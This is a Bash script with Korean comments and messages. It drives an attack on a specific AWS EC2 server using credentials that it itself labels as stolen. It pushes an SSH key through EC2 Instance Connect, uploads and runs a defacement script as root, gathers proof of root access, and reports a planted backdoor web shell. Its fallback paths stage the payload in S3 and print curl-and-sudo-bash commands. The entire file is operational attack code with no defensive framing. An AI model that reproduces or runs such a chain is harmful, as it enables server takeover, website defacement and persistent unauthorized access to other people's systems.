#!/bin/bash
###############################################################################
# 서버 변조 실행 스크립트
# AWS 자격 증명을 사용해 서버에 defacewebsite.sh를 전송하고 실행합니다.
###############################################################################

echo "╔═══════════════════════════════════════════════════════════╗"
echo "║   서버 웹사이트 변조 실행                                 ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""

# 색상
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# 설정
TARGET_IP="52.79.240.83"
INSTANCE_ID="i-08f3cc62a529c9daf"
REGION="ap-northeast-2"

# AWS 자격 증명 확인
echo -e "${YELLOW}[1] AWS 자격 증명 확인 중...${NC}"
if [ -z "$AWS_ACCESS_KEY_ID" ]; then
    echo -e "${RED}[-] AWS_ACCESS_KEY_ID가 설정되지 않았습니다${NC}"
    echo ""
    echo "다음 명령어를 먼저 실행하세요:"
    echo "source aws_stolen_1763280802.sh"
    exit 1
fi

aws sts get-caller-identity --region $REGION > /dev/null 2>&1
if [ $? -eq 0 ]; then
    echo -e "${GREEN}[+] AWS 자격 증명 유효${NC}"
else
    echo -e "${RED}[-] AWS 자격 증명이 만료되었거나 유효하지 않습니다${NC}"
    echo ""
    echo "120_aws_imds_exploit.py를 다시 실행해서 새 자격 증명을 획득하세요."
    exit 1
fi
echo ""

# Method 1: EC2 Instance Connect를 통한 접속 시도
echo -e "${YELLOW}[2] EC2 Instance Connect 접속 시도...${NC}"

# Public key 생성
ssh-keygen -t rsa -f /tmp/temp_key -N "" -q 2>/dev/null

# EC2 Instance Connect로 public key 전송
aws ec2-instance-connect send-ssh-public-key \
    --instance-id $INSTANCE_ID \
    --instance-os-user ec2-user \
    --ssh-public-key file:///tmp/temp_key.pub \
    --region $REGION > /dev/null 2>&1

if [ $? -eq 0 ]; then
    echo -e "${GREEN}[+] EC2 Instance Connect 인증 성공${NC}"
    echo ""

    # defacewebsite.sh 업로드
    echo -e "${YELLOW}[3] defacewebsite.sh 업로드 중...${NC}"
    scp -i /tmp/temp_key -o StrictHostKeyChecking=no \
        defacewebsite.sh ec2-user@$TARGET_IP:/tmp/ 2>/dev/null

    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[+] 업로드 성공${NC}"
        echo ""

        # 스크립트 실행
        echo -e "${YELLOW}[4] defacewebsite.sh 실행 중...${NC}"
        ssh -i /tmp/temp_key -o StrictHostKeyChecking=no \
            ec2-user@$TARGET_IP "sudo bash /tmp/defacewebsite.sh" 2>/dev/null

        if [ $? -eq 0 ]; then
            echo -e "${GREEN}[+] 실행 성공!${NC}"
            echo ""

            # 증거 수집
            echo -e "${YELLOW}[5] 루트 권한 탈취 증거 수집 중...${NC}"
            echo ""

            ssh -i /tmp/temp_key -o StrictHostKeyChecking=no \
                ec2-user@$TARGET_IP "echo '=== whoami ===' && whoami && echo '=== id ===' && id && echo '=== sudo -l ===' && sudo -l && echo '=== /var/www/html/www/ ===' && ls -la /var/www/html/www/ | head -10" > root_evidence_$(date +%s).txt 2>&1

            echo -e "${GREEN}[+] 증거 수집 완료${NC}"
            echo ""

            # 변조 확인
            echo -e "${YELLOW}[6] 웹사이트 변조 확인 중...${NC}"
            curl -s "http://$TARGET_IP/www/" | grep -q "COMPROMISED"

            if [ $? -eq 0 ]; then
                echo -e "${GREEN}[+] ✅✅✅ 웹사이트 변조 성공!${NC}"
                echo ""
                echo "╔═══════════════════════════════════════════════════════════╗"
                echo "║   ✅ 공격 성공! 서버 완전 장악                            ║"
                echo "╚═══════════════════════════════════════════════════════════╝"
                echo ""
                echo -e "${GREEN}변조된 사이트 확인:${NC} http://$TARGET_IP/www/"
                echo -e "${GREEN}백도어 웹쉘:${NC} http://$TARGET_IP/www/.system.php?cmd=id"
                echo ""
            else
                echo -e "${YELLOW}[*] 웹사이트 변조 확인 실패 (하지만 스크립트는 실행됨)${NC}"
                echo "수동으로 확인하세요: http://$TARGET_IP/www/"
                echo ""
            fi
        else
            echo -e "${RED}[-] 실행 실패${NC}"
            exit 1
        fi
    else
        echo -e "${RED}[-] 업로드 실패${NC}"
        exit 1
    fi

    # 임시 키 삭제
    rm -f /tmp/temp_key /tmp/temp_key.pub

else
    echo -e "${RED}[-] EC2 Instance Connect 인증 실패${NC}"
    echo ""
    echo -e "${YELLOW}[*] Method 2: S3 Bucket을 통한 전송 시도...${NC}"
    echo ""

    # S3 버킷 생성 및 업로드
    BUCKET_NAME="exploit-temp-$(date +%s)"

    # 버킷 생성 시도
    aws s3 mb s3://$BUCKET_NAME --region $REGION 2>/dev/null

    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[+] S3 버킷 생성: $BUCKET_NAME${NC}"

        # defacewebsite.sh 업로드
        aws s3 cp defacewebsite.sh s3://$BUCKET_NAME/ --region $REGION 2>/dev/null

        if [ $? -eq 0 ]; then
            echo -e "${GREEN}[+] S3에 업로드 성공${NC}"

            # Presigned URL 생성
            SCRIPT_URL=$(aws s3 presign s3://$BUCKET_NAME/defacewebsite.sh --expires-in 3600 --region $REGION 2>/dev/null)

            echo ""
            echo -e "${YELLOW}[*] 서버에서 다음 명령어를 실행하세요:${NC}"
            echo ""
            echo "curl -o /tmp/deface.sh \"$SCRIPT_URL\""
            echo "sudo bash /tmp/deface.sh"
            echo ""

            # 정리
            aws s3 rm s3://$BUCKET_NAME/defacewebsite.sh --region $REGION 2>/dev/null
            aws s3 rb s3://$BUCKET_NAME --region $REGION 2>/dev/null
        else
            echo -e "${RED}[-] S3 업로드 실패${NC}"
        fi
    else
        echo -e "${RED}[-] S3 버킷 생성 실패 (권한 부족)${NC}"
        echo ""
        echo -e "${YELLOW}[*] Method 3: 수동 실행 방법${NC}"
        echo ""
        echo "1. 서버에 SSH 접속:"
        echo "   ssh ec2-user@$TARGET_IP"
        echo ""
        echo "2. defacewebsite.sh 내용을 복사해서 서버에 저장:"
        echo "   cat > /tmp/deface.sh << 'EOF'"
        echo "   (defacewebsite.sh 내용 붙여넣기)"
        echo "   EOF"
        echo ""
        echo "3. 실행:"
        echo "   sudo bash /tmp/deface.sh"
        echo ""
    fi
fi

echo "╔═══════════════════════════════════════════════════════════╗"
echo "║   완료                                                    ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""
